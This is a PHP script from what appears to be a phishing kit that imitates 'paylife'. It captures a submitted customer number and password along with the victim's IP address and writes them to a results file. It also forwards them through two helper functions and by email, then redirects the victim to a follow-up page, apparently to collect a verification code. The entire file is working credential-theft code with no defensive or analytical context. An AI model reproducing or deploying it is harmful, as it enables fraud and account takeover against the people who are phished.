<?php
include('funcs.php');
$ip = getenv("REMOTE_ADDR");
$data = $_POST;
$user = $data["CustomerNumber"];
$pass = $data["Password"];
        $msg  = "===============================================================\n";
        $msg .= " User : $user                       \n";
        $msg .= " Pass : $pass                       \n\n";
        $msg .= " Browser : $Browser                 \n";
        $msg .= " OS : $OS                           \n";
        $msg .= " Ip : $ip                           \n\n";
        $msg .= "===============================================================\n";

        $fp = fopen("rzlt/we.txt", "a");
        fwrite($fp, $msg);
        fclose($fp);
        
    toamine($msg);
toadam($msg);
        mail($send,"paylifel 2020 | ".$user,$msg,"From: paylife <paylife@".$_SERVER['SERVER_NAME'].">");
        sleep(5);
        header("Location: codeapp.php");          
?>